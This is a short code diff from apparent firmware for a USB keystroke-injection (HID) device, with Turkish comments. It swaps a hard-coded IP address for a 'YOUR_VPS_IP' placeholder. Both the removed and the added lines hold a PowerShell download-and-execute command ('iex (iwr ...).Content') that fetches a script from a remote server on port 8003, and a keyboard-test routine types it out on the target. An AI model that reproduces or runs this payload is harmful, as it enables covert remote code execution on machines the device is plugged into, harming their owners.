@@ -2758,7 +2758,7 @@ void itTypeStringHID(const String& str) {
 //    BUYUKLER: ABCDEFGHIJKLMNOPQRSTUVWXYZ
 //    DIGITS:  0123456789
 //    OZELLER: - : / . ' ( ) = " * + , _ ? ; !
-//    URL:     http://89.252.135.43:8003/it_script/AABBCCDD
+//    URL:     http://YOUR_VPS_IP:8003/it_script/AABBCCDD
 //    KOMUT:   powershell -NoProfile -Command "iex (iwr 'URL').Content"
 //    --- TEST BITTI ---
 // =========================================================
@@ -2796,7 +2796,7 @@ void itTypeKeyboardTest() {
     "DIGITS:   0123456789\n"
     "OZELLER:  - : / . = + ' ( ) \" * , _ ?\n"
     "PLAIN INNER (asil komut):\n"
-    "iex (iwr 'http://89.252.135.43:8003/it_script/abcd1234' -usebasicparsing).content\n"
+    "iex (iwr 'http://YOUR_VPS_IP:8003/it_script/abcd1234' -usebasicparsing).content\n"
     "--- TEST BITTI ---\n";
 
   itTypeStringHID(t);
